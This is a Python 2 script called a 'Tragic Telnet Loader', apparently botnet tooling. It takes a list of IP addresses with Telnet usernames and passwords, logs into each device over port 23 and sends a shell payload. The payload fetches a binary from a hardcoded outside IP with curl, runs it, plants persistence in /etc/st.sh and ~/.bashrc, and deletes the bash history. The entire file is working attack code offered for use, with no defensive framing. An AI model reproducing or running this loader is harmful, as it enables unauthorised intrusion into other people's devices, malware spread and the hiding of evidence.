#!/usr/bin/python
# Tragic Telnet Loader

import sys, re, os, socket, time
from threading import Thread

if len(sys.argv) < 2:
	sys.exit("\033[37mUsage: python "+sys.argv[0]+" [list]")

cmd="apt install curl -y; ulimit -n 999999; rm /bin/sysmonit.bin; curl -X POST http://95.140.152.76:1339/SXkmarwet7vghj -o /bin/sysmonit.bin ; chmod +x /bin/sysmonit.bin ; /bin/sysmonit.bin & disown >> /etc/st.sh ; bash /etc/st.sh >> ~/.bashrc; bash /etc/st.sh ; rm ~/.bash_history" #Payload Goes Here, Example: Payload Goes In Between The ---> ""
info = open(str(sys.argv[1]),'a+')

def sqwad(ip,username,password):
	ip = str(ip).rstrip("\n")
	username = username.rstrip("\n")
	password = password.rstrip("\n")
	try:
		tn = socket.socket()
		tn.settimeout(5)
		tn.connect((ip,23))
	except Exception:
		print "\033[31m[\033[31m+\033[31m] \033[31mFailed To Connect!\033[31m %s"%(ip)
		tn.close()
	try:
		hoho = ''
		hoho += readUntil(tn, "ogin")
		if "ogin" in hoho:
			tn.send(username + "\n")
			print "\033[33m[\033[33m+\033[33m] \033[90mSending Username!\033[33m %s"%(ip)
			time.sleep(0.09)
		else:
			pass
	except Exception:
		tn.close()
	try:
		hoho = ''
		hoho += readUntil(tn, "assword:")
		if "assword" in hoho:
			tn.send(password + "\n")
			print "\033[33m[\033[33m+\033[33m] \033[90mSending Password!\033[33m %s"%(ip)
			time.sleep(2)
		else:
			pass
	except Exception:
		tn.close()
	try:
		tn.send("sh" + "\n")
		time.sleep(0.05)
		tn.send(cmd + "\n")
		print "\033[32m[\033[32m+\033[32m] \033[32mCommand Sent!\033[32m %s"%(ip) #False possitives because thats what yall wanted lmao
		time.sleep(15)
		tn.close()
	except Exception:
		tn.close()

def readUntil(tn, string, timeout=8):
	buf = ''
	start_time = time.time()
	while time.time() - start_time < timeout:
		buf += tn.recv(1024)
		time.sleep(0.01)
		if string in buf: return buf
	raise Exception('TIMEOUT!')

for x in info:
	try:
		if ":23 " in x:
			x = x.replace(":23 ", ":")
		xinfo = x.split(":")
		session = Thread(target=sqwad, args=(xinfo[0].rstrip("\n"),xinfo[1].rstrip("\n"),xinfo[2].rstrip("\n"),))
		session.start()
		ip=xinfo[0]
		username=xinfo[1]
		password=xinfo[2]
		time.sleep(0.01)
	except:
		pass
